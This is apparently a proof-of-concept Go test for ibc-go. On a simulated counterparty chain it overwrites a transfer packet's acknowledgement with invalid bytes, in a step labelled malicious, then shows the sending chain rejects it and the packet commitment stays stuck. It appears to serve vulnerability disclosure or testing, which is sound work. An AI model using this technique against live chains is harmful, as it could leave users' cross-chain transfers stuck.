package ibc_ack_test

import (
	"testing"

	testifysuite "github.com/stretchr/testify/suite"

	"github.com/cosmos/ibc-go/v10/modules/apps/transfer/types"
	clienttypes "github.com/cosmos/ibc-go/v10/modules/core/02-client/types"
	channeltypes "github.com/cosmos/ibc-go/v10/modules/core/04-channel/types"
	host "github.com/cosmos/ibc-go/v10/modules/core/24-host"
	ibctesting "github.com/cosmos/ibc-go/v10/testing"
)

type PoCTestSuite struct {
	testifysuite.Suite
	coordinator *ibctesting.Coordinator
	chainA      *ibctesting.TestChain
	chainB      *ibctesting.TestChain
}

func (suite *PoCTestSuite) SetupTest() {
	suite.coordinator = ibctesting.NewCoordinator(suite.T(), 2)
	suite.chainA = suite.coordinator.GetChain(ibctesting.GetChainID(1))
	suite.chainB = suite.coordinator.GetChain(ibctesting.GetChainID(2))
}

func TestPoCTestSuite(t *testing.T) {
	testifysuite.Run(t, new(PoCTestSuite))
}

func (suite *PoCTestSuite) TestStuckPacketOnBadAck() {
	suite.SetupTest()

	// 1. Create Transfer Path
	path := ibctesting.NewPath(suite.chainA, suite.chainB)
	path.EndpointA.ChannelConfig.PortID = ibctesting.TransferPort
	path.EndpointB.ChannelConfig.PortID = ibctesting.TransferPort
	path.EndpointA.ChannelConfig.Version = types.V1
	path.EndpointB.ChannelConfig.Version = types.V1

	suite.coordinator.Setup(path)

	// 2. Send Transfer from A to B
	// Create MsgTransfer
	coin := ibctesting.TestCoin
	msg := types.NewMsgTransfer(
		path.EndpointA.ChannelConfig.PortID,
		path.EndpointA.ChannelID,
		coin,
		suite.chainA.SenderAccount.GetAddress().String(),
		suite.chainB.SenderAccount.GetAddress().String(),
		clienttypes.NewHeight(1, 1000),
		0,
		"",
	)

	// Submit MsgTransfer
	res, err := suite.chainA.SendMsgs(msg)
	suite.Require().NoError(err)

	packet, err := ibctesting.ParsePacketFromEvents(res.Events)
	suite.Require().NoError(err)
	suite.Require().NotNil(packet)

	// 3. Receive Packet on B
	err = path.EndpointB.UpdateClient()
	suite.Require().NoError(err)

	// Construct RecvPacket
	recvMsg := channeltypes.NewMsgRecvPacket(
		packet,
		nil, // ProofCommitment
		clienttypes.NewHeight(0,0), // ProofHeight
		suite.chainB.SenderAccount.GetAddress().String(),
	)

	// Helper to get proof
	packetKey := host.PacketCommitmentKey(packet.GetSourcePort(), packet.GetSourceChannel(), packet.GetSequence())
	proof, proofHeight := path.EndpointB.Counterparty.QueryProof(packetKey)
	recvMsg.ProofCommitment = proof
	recvMsg.ProofHeight = proofHeight

	// Execute RecvPacket
	res, err = suite.chainB.SendMsgs(recvMsg)
	suite.Require().NoError(err)

	// 4. B has written Acknowledgement. We verify it exists.
	ackKey := host.PacketAcknowledgementKey(packet.GetDestPort(), packet.GetDestChannel(), packet.GetSequence())
	actualAck, found := suite.chainB.GetSimApp().IBCKeeper.ChannelKeeper.GetPacketAcknowledgement(suite.chainB.GetContext(), packet.GetDestPort(), packet.GetDestChannel(), packet.GetSequence())
	suite.Require().True(found)
	suite.Require().NotEmpty(actualAck)

	// 5. MALICIOUS ACTION: Overwrite Acknowledgement on B with Garbage
	garbageAck := []byte("invalid-json-garbage-ack")
	suite.chainB.GetSimApp().IBCKeeper.ChannelKeeper.SetPacketAcknowledgement(
		suite.chainB.GetContext(),
		packet.GetDestPort(),
		packet.GetDestChannel(),
		packet.GetSequence(),
		channeltypes.CommitAcknowledgement(garbageAck),
	)

	// Commit the malicious change
	suite.coordinator.CommitBlock(suite.chainB)

	// 6. Relay Ack to A
	err = path.EndpointA.UpdateClient()
	suite.Require().NoError(err)

	// Query proof of the garbage ack
	proofAck, proofHeightAck := path.EndpointA.Counterparty.QueryProof(ackKey)

	// Construct MsgAcknowledgement
	ackMsg := channeltypes.NewMsgAcknowledgement(
		packet,
		garbageAck, // The raw garbage bytes
		proofAck,
		proofHeightAck,
		suite.chainA.SenderAccount.GetAddress().String(),
	)

	// Execute MsgAcknowledgement on A
	// This should FAIL because transfer module cannot unmarshal garbageAck
	res, err = suite.chainA.SendMsgs(ackMsg)

	// Expectation: Error
	suite.Require().Error(err)
	suite.T().Logf("Got expected error: %v", err)

	// 7. Verify Packet Commitment still exists on A (STUCK)
	commit := suite.chainA.GetSimApp().IBCKeeper.ChannelKeeper.GetPacketCommitment(
		suite.chainA.GetContext(),
		packet.GetSourcePort(),
		packet.GetSourceChannel(),
		packet.GetSequence(),
	)
	suite.Require().NotEmpty(commit, "Packet commitment should still exist (stuck)")
}
